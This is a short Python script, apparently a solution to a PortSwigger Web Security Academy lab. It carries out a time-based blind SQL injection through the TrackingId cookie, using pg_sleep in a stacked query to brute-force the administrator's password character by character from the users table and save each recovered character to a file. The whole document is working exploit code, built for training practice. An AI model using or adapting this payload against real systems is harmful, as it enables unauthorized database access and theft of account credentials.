import requests

s = requests.Session()

url = "https://0aa7005904e463c481bb4d7c00370004.web-security-academy.net/login"
# original cookie
cookie = {"TrackingId":"1orl79unYBTBTLrb"}
# payload
p = "none'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,20,1)='@') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"

wordlist = 'qwertyuiopasdfghjklzxcvbnm0987654321'

for char in wordlist:
	new_p = p.replace('@', char)
	cookie['TrackingId'] = new_p
	print(f"Send request with payload {char}")
	res = s.get(url,cookies=cookie)
	if res.elapsed.total_seconds() > 10:
		print(f"[+] Character {char} found!")
		with open('password.txt', 'a') as f:
			f.write(char)
			print("Char has been written")
		break
print("Increase the password position for the next request")
